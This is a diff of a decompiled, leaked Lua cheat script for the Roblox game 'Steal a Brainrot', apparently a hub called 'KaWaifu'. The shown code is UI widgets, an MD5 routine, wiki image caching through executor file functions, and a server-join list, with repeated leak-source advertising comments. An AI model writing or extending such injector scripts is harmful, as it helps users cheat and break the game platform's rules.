-				up_104 = slicedfn31
-				slicedfn52 = function(B,I,e,H)local a=e and true or false;local e=up_99("TextButton",{Size=UDim2.new(1,0,0,34),BackgroundColor3=up_100.Element,AutoButtonColor=false,Text="",LayoutOrder=up_101(B),ZIndex=2,Parent=B});up_102(e,8);up_99("TextLabel",{Position=UDim2.fromOffset(12,0),Size=UDim2.new(1,-70,1,0),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text=I,TextColor3=up_100.Text,TextSize=16,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=e});local B=up_99("Frame",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-12,0.5,0),Size=UDim2.fromOffset(38,20),BackgroundColor3=a and up_100.Accent or up_100.SliderTrack,BorderSizePixel=0,ZIndex=2,Parent=e});up_102(B,10);local I=up_99("Frame",{AnchorPoint=Vector2.new(0,0.5),Position=a and(UDim2.new(1,-18,0.5,0))or(UDim2.new(0,2,0.5,0)),Size=UDim2.fromOffset(16,16),BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=0,ZIndex=2,Parent=B});up_102(I,8);local function K()up_103(I,0.18,{Position=a and(UDim2.new(1,-18,0.5,0))or(UDim2.new(0,2,0.5,0))},Enum.EasingStyle.Back);up_103(B,0.18,{BackgroundColor3=a and up_100.Accent or up_100.SliderTrack});end;up_104 (e.MouseEnter:Connect(function()up_103(e,0.15,{BackgroundColor3=up_100.ElementHover});end));up_104 (e.MouseLeave:Connect(function()up_103(e,0.15,{BackgroundColor3=up_100.Element});end));up_104 (e.MouseButton1Click:Connect(function()a=not a;K();if H then task.spawn(H,a);end;end));return e;end
-				up_105 = slicedfn37
-				up_106 = tbl22
-				up_107 = slicedfn47
-				up_108 = slicedfn39
-				up_109 = slicedfn38
-				up_110 = slicedfn31
-				slicedfn53 = function(B,I,e,H,a,K)local L,A=tonumber((K or{}).chipWidth)or 98,1;for K,P in ipairs(e)do if P.value==H then A=K;break;end;end;local H=up_105("TextButton",{Size=UDim2.new(1,0,0,34),BackgroundColor3=up_106.Element,AutoButtonColor=false,Text="",LayoutOrder=up_107(B),ZIndex=2,Parent=B});up_108(H,8);up_105("TextLabel",{Position=UDim2.fromOffset(12,0),Size=UDim2.new(1,-(L+20),1,0),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text=I,TextColor3=up_106.Text,TextSize=16,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=H});local B=up_105("TextButton",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-8,0.5,0),Size=UDim2.fromOffset(L,24),BackgroundColor3=e[A].color:Lerp(up_106.Element,0.82),AutoButtonColor=false,Font=Enum.Font.GothamBold,Text=e[A].label,TextColor3=e[A].color:Lerp(up_106.Text,0.5),TextSize=13,ZIndex=3,Parent=H});up_108(B,7);local I=up_105("UIStroke",{Color=e[A].color:Lerp(up_106.Stroke,0.55),Transparency=0.4,Thickness=1,Parent=B});local function K()local L=e[A];B.Text=L.label;up_109(B,0.15,{BackgroundColor3=L.color:Lerp(up_106.Element,0.82),TextColor3=L.color:Lerp(up_106.Text,0.5)});up_109(I,0.15,{Color=L.color:Lerp(up_106.Stroke,0.55)});end;local function I()A=A%#e+1;K();if a then task.spawn(a,e[A].value);end;end;up_110 (H.MouseEnter:Connect(function()up_109(H,0.15,{BackgroundColor3=up_106.ElementHover});end));up_110 (H.MouseLeave:Connect(function()up_109(H,0.15,{BackgroundColor3=up_106.Element});end));up_110 (H.MouseButton1Click:Connect(I));up_110 (B.MouseButton1Click:Connect(I));return H;end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				up_111 = slicedfn37
-				up_112 = tbl22
-				up_113 = slicedfn47
-				up_114 = slicedfn39
-				up_115 = slicedfn31
-				up_116 = slicedfn44
-				slicedfn54 = function(B,I,e,H,a,K,L)L=L or{};local A=L.decimals or 0;local P=10^A;local function v(N)return math.floor(N*P+0.5)/P;end;local function P(N)if A>0 then return string.format("%."..A.."f",N);end;return tostring(N);end;local A;if L.uncapped then A=v(math.max(e,a or e));else A=v(math.clamp(a or e,e,H));end;a=up_111("Frame",{Size=L.size or(UDim2.new(1,0,0,52)),BackgroundColor3=up_112.Element,BorderSizePixel=0,LayoutOrder=L.layoutOrder or(up_113(B)),ZIndex=2,Parent=L.parent or B});up_114(a,8);up_111("TextLabel",{Position=UDim2.fromOffset(12,6),Size=UDim2.new(1,-80,0,18),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text=I,TextColor3=up_112.Text,TextSize=16,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=a});local B=up_111("TextBox",{AnchorPoint=Vector2.new(1,0),Position=UDim2.new(1,-10,0,5),Size=UDim2.fromOffset(58,20),BackgroundColor3=up_112.SliderTrack,BackgroundTransparency=0.25,ClearTextOnFocus=false,Font=Enum.Font.GothamBold,Text=P(A),TextColor3=up_112.Accent2,TextSize=16,TextXAlignment=Enum.TextXAlignment.Center,ClipsDescendants=true,ZIndex=3,Parent=a});up_114(B,6);up_111("UIStroke",{Color=up_112.Stroke,Transparency=0.5,Thickness=1,Parent=B});local N=up_111("Frame",{Position=UDim2.new(0,12,0,34),Size=UDim2.new(1,-24,0,6),BackgroundColor3=up_112.SliderTrack,BorderSizePixel=0,ZIndex=2,Parent=a});up_114(N,3);I=H>e and(math.clamp((A-e)/(H-e),0,1))or 0;local S=up_111("Frame",{Size=UDim2.new(I,0,1,0),BackgroundColor3=up_112.Accent,BorderSizePixel=0,ZIndex=2,Parent=N});up_114(S,3);local j=up_111("Frame",{AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.new(I,0,0.5,0),Size=UDim2.fromOffset(12,12),BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=0,ZIndex=3,Parent=N});up_114(j,6);I=up_111("TextButton",{AnchorPoint=Vector2.new(0,0.5),Position=UDim2.new(0,0,0.5,0),Size=UDim2.new(1,0,0,22),BackgroundTransparency=1,Text="",ZIndex=4,Parent=N});local function p(W)local r=math.clamp((W.X-N.AbsolutePosition.X)/math.max(N.AbsoluteSize.X,1),0,1);W=v(e+(H-e)*r);S.Size=UDim2.new(r,0,1,0);j.Position=UDim2.new(r,0,0.5,0);if W~=A then A=W;B.Text=P(A);if K then task.spawn(K,A);end;end;end;local function N(W)W=tonumber(W);if not W then B.Text=P(A);return;end;W=v(W);W=if L.uncapped then(math.max(e,W))else(math.clamp(W,e,H));local L=H>e and(math.clamp((W-e)/(H-e),0,1))or 0;S.Size=UDim2.new(L,0,1,0);j.Position=UDim2.new(L,0,0.5,0);B.Text=P(W);if W~=A then A=W;if K then task.spawn(K,A);end;end;end;up_115 (B.FocusLost:Connect(function()N(B.Text);end));up_115 (I.InputBegan:Connect(function(B)if B.UserInputType==Enum.UserInputType.MouseButton1 or B.UserInputType==Enum.UserInputType.Touch then p(B.Position);up_116(function(w)p(w.Position);end,nil,B.UserInputType);end;end));return a;end
-				up_117 = slicedfn37
-				up_118 = tbl22
-				up_119 = slicedfn47  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				up_120 = slicedfn39
-				up_121 = slicedfn31
-				slicedfn55 = function(B,I,e)local H=up_117("Frame",{Size=UDim2.new(1,0,0,34),BackgroundColor3=up_118.Element,BorderSizePixel=0,LayoutOrder=up_119(B),ZIndex=2,Parent=B});up_120(H,8);up_117("UIStroke",{ApplyStrokeMode=Enum.ApplyStrokeMode.Border,Color=up_118.Stroke,Transparency=0.4,Thickness=1,Parent=H});local B=up_117("TextBox",{Position=UDim2.fromOffset(12,0),Size=UDim2.new(1,-24,1,0),BackgroundTransparency=1,ClearTextOnFocus=false,Font=Enum.Font.Gotham,PlaceholderText=I,PlaceholderColor3=up_118.TextDim,Text="",TextColor3=up_118.Text,TextSize=16,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=H});up_121 (B.FocusLost:Connect(function(w)if e then task.spawn(e,B.Text,w,B);end;end));return H,B;end
-				tbl26 = {}
-				tbl27 = {}
-				tbl28 = {}
-				tbl29 = {}
-				tbl30 = {}
-				tbl31 = { 15, 60, 300 }
-				flag21 = false  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				pcall(function()
-					if makefolder and isfolder then
-						if not isfolder("KaWaifu_Icons") then
-							makefolder("KaWaifu_Icons")
-						end
-
-						flag21 = isfolder("KaWaifu_Icons") == true
-					end
-				end)
-
-				slicedfn61 = function(arg)
-					return "KWImg_" .. tostring(arg):gsub("[^%w]", "_") .. ".png"  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				end
-
-				slicedfn62 = function(arg)
-					local v = slicedfn61(arg)
-					if flag21 then
-						return "KaWaifu_Icons" .. "/" .. v
-					end
-					return v
-				end
-
-				do
-					local band = bit32.band  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					local bor = bit32.bor
-					local bxor = bit32.bxor
-					local bnot = bit32.bnot
-					local lrotate = bit32.lrotate
-					local rshift = bit32.rshift
-
-					local tbl32 = {
-						3614090360,
-						3905402710,
-						606105819,
-						3250441966,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						4118548399,
-						1200080426,
-						2821735955,
-						4249261313,
-						1770035416,
-						2336552879,
-						4294925233,
-						2304563134,
-						1804603682,
-						4254626195,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						2792965006,
-						1236535329,
-						4129170786,
-						3225465664,
-						643717713,
-						3921069994,
-						3593408605,
-						38016083,
-						3634488961,
-						3889429448,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						568446438,
-						3275163606,
-						4107603335,
-						1163531501,
-						2850285829,
-						4243563512,
-						1735328473,
-						2368359562,
-						4294588738,
-						2272392833,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						1839030562,
-						4259657740,
-						2763975236,
-						1272893353,
-						4139469664,
-						3200236656,
-						681279174,
-						3936430074,
-						3572445317,
-						76029189,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						3654602809,
-						3873151461,
-						530742520,
-						3299628645,
-						4096336452,
-						1126891415,
-						2878612391,
-						4237533241,
-						1700485571,
-						2399980690,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						4293915773,
-						2240044497,
-						1873313359,
-						4264355552,
-						2734768916,
-						1309151649,
-						4149444226,
-						3174756917,
-						718787259,
-						3951481745,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					}
-
-					local tbl33 = {
-						7,
-						12,
-						17,
-						22,
-						7,
-						12,
-						17,
-						22,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						7,
-						12,
-						17,
-						22,
-						7,
-						12,
-						17,
-						22,
-						5,
-						9,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						14,
-						20,
-						5,
-						9,
-						14,
-						20,
-						5,
-						9,
-						14,
-						20,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						5,
-						9,
-						14,
-						20,
-						4,
-						11,
-						16,
-						23,
-						4,
-						11,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						16,
-						23,
-						4,
-						11,
-						16,
-						23,
-						4,
-						11,
-						16,
-						23,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						6,
-						10,
-						15,
-						21,
-						6,
-						10,
-						15,
-						21,
-						6,
-						10,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						15,
-						21,
-						6,
-						10,
-						15,
-						21,
-					}
-
-					slicedfn64 = function(arg)
-						local n = 1732584193
-						local slicedn33 = #arg  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						local str10 = arg .. "\128"
-
-						while #str10 % 64 ~= 56 do
-							str10 ..= "\0"
-						end
-
-						local slicedn34 = slicedn33 * 8
-
-						for i = 0, 7 do
-							str10 ..= string.char(math.floor(slicedn34 / 256 ^ i) % 256)
-						end
-
-						local slicedn35 = 4023233417
-						local slicedn36 = 2562383102  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						local slicedn37 = 271733878
-
-						for i = 1, #str10, 64 do
-							local tbl34 = {}
-
-							for i2 = 0, 15 do
-								local slicedn38 = i + i2 * 4
-								local v, sliced91, sliced92, sliced93 = string.byte(str10, slicedn38, slicedn38 + 3)
-								tbl34[i2] = v + sliced91 * 256 + sliced92 * 65536 + sliced93 * 16777216
-							end
-
-							local slicedn38 = slicedn35
-							local v = slicedn36  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							local sliced91 = slicedn37
-							local sliced92 = n
-
-							for i2 = 0, 63 do
-								local sliced93, slicedn39
-
-								if i2 < 16 then
-									sliced93 = bor(band(slicedn38, v), band(bnot(slicedn38), sliced91))
-									slicedn39 = i2
-								elseif i2 < 32 then
-									sliced93 = bor(band(sliced91, slicedn38), band(bnot(sliced91), v))
-									slicedn39 = (5 * i2 + 1) % 16  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								elseif i2 < 48 then
-									sliced93 = bxor(slicedn38, v, sliced91)
-									slicedn39 = (3 * i2 + 5) % 16
-								else
-									sliced93 = bxor(v, bor(slicedn38, bnot(sliced91)))
-									slicedn39 = 7 * i2 % 16
-								end
-
-								local slicedn40 = (sliced93 + sliced92 + tbl32[i2 + 1] + tbl34[slicedn39]) % 4294967296
-								local sliced94 = 4294967296
-								sliced92 = sliced91  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								sliced91 = v
-								v = slicedn38
-								slicedn38 = (slicedn38 + lrotate(slicedn40, tbl33[i2 + 1])) % sliced94
-							end
-
-							n = (n + sliced92) % 4294967296
-							slicedn35 = (slicedn35 + slicedn38) % 4294967296
-							slicedn36 = (slicedn36 + v) % 4294967296
-							slicedn37 = (slicedn37 + sliced91) % 4294967296
-						end
-
-						local function slicedfn65(arg2)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							return string.format("%02x%02x%02x%02x", arg2 % 256, rshift(arg2, 8) % 256, rshift(arg2, 16) % 256, rshift(arg2, 24) % 256)
-						end
-
-						return slicedfn65(n) .. slicedfn65(slicedn35) .. slicedfn65(slicedn36) .. slicedfn65(slicedn37)
-					end
-				end
-			end
-
-			do
-				local function slicedfn65(arg)
-					return tostring(arg):gsub("%s+", "_") .. ".png"
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				local function slicedfn66(arg)
-					local str10 = tostring(arg):gsub("%s+", "_")
-					local str11
-
-					if #str10 > 1 then
-						str11 = str10:sub(1, 1) .. str10:sub(2):lower()
-					else
-						str11 = str10
-					end
-
-					return str11 .. ".png"
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				local function slicedfn67(arg)
-					local v = slicedfn64(arg)
-					return ("https://static.wikia.nocookie.net/%s/images/%s/%s/%s"):format("stealabr", v:sub(1, 1), v:sub(1, 2), arg)
-				end
-
-				local function slicedfn68(arg)
-					if type(arg) ~= "string" or not arg:find("static%.wikia%.nocookie%.net") then
-						return arg
-					end
-
-					if arg:find("/revision/") then
-
-						return arg .. (arg:find("?", 1, true) and "&format=original" or "?format=original")  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-
-					return arg .. "/revision/latest?format=original"
-				end
-
-				local function slicedfn69(arg)
-					if true then
-						local str10 = "https://stealabrainrot.fandom.com/api.php?action=query&prop=pageimages" .. "&piprop=thumbnail&pithumbsize=256&format=json&redirects=1&titles=" .. service:UrlEncode(tostring(arg))
-
-						local ok, result = pcall(function()
-							if true then
-								return game:HttpGet(str10)
-							end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-						end)
-
-						if not ok or type(result) ~= "string" or result == "" then
-							return nil
-						end
-
-						local ok2, result2 = pcall(function()
-							return service:JSONDecode(result)
-						end)
-
-						local flag22 = not ok2
-
-						if not flag22 then
-							local v = "table"  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							flag22 = type(result2) ~= v
-						end
-
-						if flag22 then
-							return nil
-						end
-						local pages = result2.query and result2.query.pages
-						if type(pages) ~= "table" then
-							return nil
-						end
-
-						for _, page in pairs(pages) do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							local v = "table"
-							local flag23 = type(page) == v
-
-							if flag23 then
-								local sliced91 = "table"
-								flag23 = type(page.thumbnail) == sliced91
-							end
-
-							if flag23 and type(page.thumbnail.source) == "string" and page.thumbnail.source ~= "" then
-								return slicedfn68(page.thumbnail.source)
-							end
-						end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-						return nil
-					end
-
-				end
-
-				slicedfn63 = function(arg)
-					local tbl32 = {}
-					local v = slicedfn69(arg)
-
-					if v then
-						tbl32[#tbl32 + 1] = v
-					end
-
-					tbl32[#tbl32 + 1] = slicedfn68(slicedfn67(slicedfn65(arg)))  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					local sliced91 = slicedfn66(arg)
-
-					if sliced91 ~= slicedfn65(arg) then
-						tbl32[#tbl32 + 1] = slicedfn68(slicedfn67(sliced91))
-					end
-
-					return tbl32
-				end
-			end
-		end
-
-		do
-			local slicedfn64, slicedfn65, slicedfn66, slicedfn67  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			do
-				slicedfn64 = function(arg)
-
-					if type(arg) ~= "string" or #arg < 16 then
-						return false
-					end
-
-					local v, sliced91, sliced92, sliced93 = string.byte(arg, 1, 4)
-					if v == 137 and sliced91 == 80 and sliced92 == 78 and sliced93 == 71 then
-						return true
-					end
-
-					if v == 255 and sliced91 == 216 and sliced92 == 255 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						return true
-					end
-					return false
-				end
-
-				slicedfn56 = function(arg)
-					if not arg or arg == "" then
-						return nil
-					end
-
-					if tbl26[arg] then
-						return tbl26[arg]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-					local v = tbl27[arg]
-					if v then
-						return v
-					end
-					local brainrotImageResolver = tbl25.brainrotImageResolver
-
-					if brainrotImageResolver then
-						local ok, result = pcall(brainrotImageResolver, arg)
-						if ok and type(result) == "string" and result ~= "" then
-							return result  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-					end
-
-					return nil
-				end
-
-				slicedfn65 = function(arg)
-					local v = nil
-
-					pcall(function()
-						if getcustomasset then
-							v = getcustomasset(arg)
-
-						elseif getsynasset then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							v = getsynasset(arg)
-						end
-					end)
-
-					if type(v) == "string" and v ~= "" then
-						return v
-					end
-					return nil
-				end
-
-				slicedfn66 = function(arg)
-					if true then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						local ok, result = pcall(readfile, arg)
-						return ok and slicedfn64(result)
-					end
-
-				end
-
-				do
-					local function slicedfn68(arg)
-						local n = #tbl31
-						return tbl31[math.min(math.max(arg, 1), n)]
-					end
-
-					slicedfn67 = function(arg)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						local v = tbl28[arg]
-						if not v then
-							return false
-						end
-						return os.clock() - (v.ts or 0) < slicedfn68(v.attempts or 1)
-					end
-				end
-			end
-
-			do
-				local function slicedfn68(arg)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					if true then
-						local v = slicedfn62(arg)
-
-						if flag21 then
-							local sliced91 = 6085
-
-							if true then
-								local sliced92 = slicedfn61(arg)
-
-								pcall(function()
-									if isfile and isfile(sliced92) and not isfile(v) then
-										if slicedfn66(sliced92) then
-											writefile(v, readfile(sliced92))  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										end
-
-										if delfile then
-											pcall(delfile, sliced92)
-										end
-									end
-								end)
-							end
-						end
-
-						if isfile and isfile(v) then
-							if slicedfn66(v) then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local sliced91 = slicedfn65(v)
-
-								if sliced91 then
-									local sliced92 = 7407
-									if true then
-										return sliced91
-									end
-
-								end
-							elseif delfile then
-								pcall(delfile, v)
-							end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-
-						for _, sliced91 in ipairs(slicedfn63(arg)) do
-							local ok, result = pcall(function()
-								return game:HttpGet(sliced91)
-							end)
-
-							if ok and slicedfn64(result) then
-								if pcall(function()
-									writefile(v, result)
-								end) then
-									local sliced92 = slicedfn65(v)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									if sliced92 then
-										return sliced92
-									end
-								end
-							end
-						end
-
-						return nil
-					end
-
-				end
-
-				slicedfn57 = function(arg, arg2)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					if true then
-						if not arg or arg == "" then
-							return
-						end
-						local v = tbl27[arg]
-
-						if v then
-							if arg2 then
-								arg2(v)
-							end
-
-							return  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-
-						if tbl29[arg] then
-							if arg2 then
-								local tbl32 = tbl30[arg]
-
-								if not tbl32 then
-									tbl32 = {}
-									tbl30[arg] = tbl32
-								end
-
-								tbl32[#tbl32 + 1] = arg2
-							end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-							return
-						end
-
-						if slicedfn67(arg) then
-							return
-						end
-						tbl29[arg] = true
-
-						task.spawn(function()
-							task.wait()
-
-							if tbl27[arg] then
-								tbl29[arg] = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local sliced91 = tbl27[arg]
-
-								if arg2 then
-									arg2(sliced91)
-								end
-
-								local sliced92 = tbl30[arg]
-								tbl30[arg] = nil
-
-								if sliced92 then
-									for _, sliced93 in ipairs(sliced92) do
-										pcall(sliced93, sliced91)
-									end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								end
-
-								return
-							end
-
-							local ok, result = pcall(slicedfn68, arg)
-
-							if not ok then
-								result = nil
-							end
-
-							tbl29[arg] = nil
-							local sliced91 = tbl30[arg]
-							tbl30[arg] = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-							if result then
-								if true then
-									tbl27[arg] = result
-									tbl28[arg] = nil
-
-									if arg2 then
-										arg2(result)
-
-									end
-
-									if sliced91 then
-										for _, sliced92 in ipairs(sliced91) do
-											pcall(sliced92, result)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										end
-									end
-								end
-							else
-								local tbl32 = tbl28[arg] or { attempts = 0 }
-								tbl32.attempts = (tbl32.attempts or 0) + 1
-								tbl32.ts = os.clock()
-								tbl28[arg] = tbl32
-							end
-						end)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-						return
-					end
-
-				end
-			end
-
-			slicedfn58 = function(arg)
-				if not (listfiles and delfile) then
-					return
-				end
-
-				if type(arg) ~= "table" or #arg < 25 then
-					return  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				end
-				local tbl32 = {}
-
-				for _, v in ipairs(arg) do
-					tbl32[slicedfn61(v)] = true
-				end
-
-				local function slicedfn68(arg2)
-					return tostring(arg2):match("([^/\\]+)$") or tostring(arg2)
-				end
-
-				local function slicedfn69(arg2)
-					return arg2:sub(1, 6) == "KWImg_" and arg2:sub(-4) == ".png"  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				end
-
-				if flag21 then
-					pcall(function()
-						for _, v in ipairs(listfiles("KaWaifu_Icons")) do
-							local sliced91 = slicedfn68(v)
-
-							if slicedfn69(sliced91) and not tbl32[sliced91] then
-								pcall(delfile, v)
-							end
-						end
-					end)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				end
-
-				pcall(function()
-					for _, v in ipairs(listfiles("")) do
-						local sliced91 = slicedfn68(v)
-
-						if slicedfn69(sliced91) and sliced91 == v:gsub("[/\\]", "") then
-							if not tbl32[sliced91] then
-								pcall(delfile, v)
-							elseif flag21 then
-								pcall(function()
-									local str10 = "KaWaifu_Icons" .. "/" .. sliced91  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-									if not (isfile and isfile(str10)) and slicedfn66(v) then
-										writefile(str10, readfile(v))
-									end
-
-									pcall(delfile, v)
-								end)
-							end
-						end
-					end
-				end)
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-	end
-
-	do
-		local tbl26 = {}
-		local v = pairs
-		local rarityColors = tbl17.RarityColors or {}
-
-		for k, rarityColor in v(rarityColors) do
-			local ok, result = pcall(Color3.fromHex, rarityColor)
-
-			if ok then
-				tbl26[k] = result  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			else
-				warn("[KaWaifu] TUNING.RarityColors." .. tostring(k) .. " = " .. tostring(rarityColor) .. " is not a valid hex colour — it will use the Default colour")
-			end
-		end
-
-		slicedfn59 = function(w)return string.format("#%02X%02X%02X",math.floor(w.R*255+0.5),math.floor(w.G*255+0.5),math.floor(w.B*255+0.5));end
-		up_122 = tbl25
-		up_123 = slicedfn59
-		up_124 = tbl22
-		slicedfn60 = function(B)local I=up_122.mutationHexResolver;if I then local e,H=pcall(I,B);if e and type(H)=="string"and H:sub(1,1)=="#"then return H;end;end;return up_123(up_124.Accent2);end
-		up_125 = tbl17  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_126 = slicedfn59
-		up_127 = tbl22
-		up_128 = tbl25
-		up_129 = slicedfn38
-		up_130 = flag18
-		up_131 = Frame
-		up_132 = slicedfn37
-		up_133 = slicedfn39
-		up_134 = slicedfn60
-		up_135 = tbl26  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	end
+if _G.FRHUBNormalSteal and _G.FRHUBNormalSteal.stealConn then
+    pcall(function() _G.FRHUBNormalSteal.stealConn:Disconnect() end)
 end
-
-local slicedfn61, sliced91, sliced92, n, slicedn33, sliced93, sliced94, sliced95, slicedfn62
-
-do
-	do
-		local Frame2
-
-		do
-			do
-				do
-					up_136 = slicedfn56  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					up_137 = slicedfn57
-					up_138 = ScreenGui
-					up_139 = splitView
-					slicedfn61 = function(B,I)local e=up_125.ExpandRowHeight;local H=up_125.ExpandRowGap;local a={};local K=0;local L=up_126(up_127.Accent);local function A(P,v,N,S,j)return("%s   |   <font color=\"%s\">%s</font>   |   <font color=\"%s\">%s</font>%s"):format(P,N,v,L,S,j or"");end;local function L(P,v,N)return Color3.new(P.R+(v.R-P.R)*N,P.G+(v.G-P.G)*N,P.B+(v.B-P.B)*N);end;local function P(v)local N;if v.joining then N="joining";else local S=up_128.joinStatusResolver;if S and v.jobId then local j,p=pcall(S,v.jobId);N=if j then p else N;end;end;if N==v.lastStatus then return;end;v.lastStatus=N;if N=="joining"then v.accentBar.BackgroundColor3=up_127.Warn;v.row.BackgroundColor3=L(up_127.Element,up_127.Warn,0.14);elseif N=="joined"then v.accentBar.BackgroundColor3=up_127.Good;v.row.BackgroundColor3=L(up_127.Element,up_127.Good,0.14);elseif N=="failed"then v.accentBar.BackgroundColor3=up_127.Bad;v.row.BackgroundColor3=L(up_127.Element,up_127.Bad,0.14);else v.accentBar.BackgroundColor3=v.barBase or up_127.Accent;v.row.BackgroundColor3=up_127.Element;end;v.iconHolder.BackgroundColor3=v.row.BackgroundColor3;end;local v,N,S;local function j(p,W,r)local s=p.joinBtn;if W then if s then local y=W.."/"..(r or"?");s.TextSize=#y>6 and 11 or#y>4 and 13 or 15;s.Text=y;if not p.joining then s:SetAttribute("joining",true);up_129(s,0.15,{BackgroundColor3=up_127.Warn});end;end;if not p.joining then p.joining=true;P(p);end;elseif p.joining then p.joining=nil;if s then s:SetAttribute("joining",nil);s.TextSize=15;s.Text="JOIN";up_129(s,0.15,{BackgroundColor3=up_127.Good});end;P(p);end;end;local function p(W,r,s)if not up_130 or not W then return;end;if v and v~=W then for y,y in ipairs(a)do if y.jobId==v then j(y,nil);end;end;end;v,N,S=W,r,s;for y,y in ipairs(a)do if y.jobId==W then j(y,r,s);end;end;end;local function W(r)if not up_130 or not r then return;end;for s,s in ipairs(a)do if s.jobId==r then j(s,nil);end;end;if v==r then v,N,S=nil,nil,nil;end;end;local function r(s)for y,y in ipairs(a)do if y.jobId==s then return y.name;end;end;return nil;end;local function s(y)local h=up_128.jobElapsedResolver;if h and y.jobId then local _,o=pcall(h,y.jobId);if _ and type(o)=="number"then return o;end;end;return os.clock()-y.t0;end;task.spawn(function()while up_130 do local y=up_131.Visible;for h=#a,1,-1 do local _=a[h];if _.row.Parent then if y then local y=math.floor(s(_));if y~=_.lastElapsedSec then _.lastElapsedSec=y;_.line2.Text=A(tostring(y).."s",_.mutation,_.mutHex,_.earn,_.carpetTag);end;end;P(_);if _.lastStatus=="cleared"then _.row:Destroy();table.remove(a,h);end;end;end;task.wait(1);end;end);local function y(h)local _=up_132("TextButton",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-10,0,24),Size=UDim2.fromOffset(56,28),BackgroundColor3=up_127.Good,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="JOIN",TextColor3=Color3.fromRGB(16,24,18),TextSize=15,ZIndex=3,Parent=h});up_133(_,6);_.MouseEnter:Connect(function()if not _:GetAttribute("joining")then up_129(_,0.12,{BackgroundColor3=Color3.fromRGB(130,215,158)});end;end);_.MouseLeave:Connect(function()if not _:GetAttribute("joining")then up_129(_,0.12,{BackgroundColor3=up_127.Good});end;end);return _;end;local function h(_,o,E)local R=E.mutation and tostring(E.mutation)~=""and(tostring(E.mutation))or"Normal";local J=up_134(R);local l=up_132("Frame",{Size=UDim2.new(1,0,0,e),BackgroundColor3=L(up_127.Element,up_127.Background,0.45),BorderSizePixel=0,LayoutOrder=o,ZIndex=2,Parent=_});up_133(l,6);up_132("Frame",{Position=UDim2.fromOffset(10,8),Size=UDim2.new(0,2,1,-16),BackgroundColor3=E.rarity and up_135[E.rarity]or 